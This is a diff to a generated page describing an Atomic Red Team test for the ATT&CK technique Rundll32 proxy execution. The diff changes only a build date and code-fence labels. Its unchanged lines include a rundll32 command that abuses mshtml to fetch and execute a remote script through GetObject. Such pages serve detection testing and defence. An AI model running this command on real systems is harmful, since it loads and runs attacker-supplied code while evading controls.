@@ -6,7 +6,7 @@ generated: "true"
 attack_technique_id: "T1218.011"
 attack_technique_name: "Signed Binary Proxy Execution: Rundll32"
 source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1218.011/T1218.011.yaml"
-build_date: "2026-04-26 14:38:40"
+build_date: "2026-04-26 17:02:12"
 executor: "command_prompt"
 aliases:
   - "57ba4ce9-ee7a-4f27-9928-3c70c489b59d"
@@ -53,13 +53,13 @@ Note: The GetObject function is no longer supported in Internet Explorer v9 (201
 
 ### Command
 
-```commandprompt
+```cmd
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:#{file_url}").Exec();window.close();
 ```
 
 ### Cleanup
 
-```commandprompt
+```cmd
 taskkill /IM notepad.exe /f
 ```
 
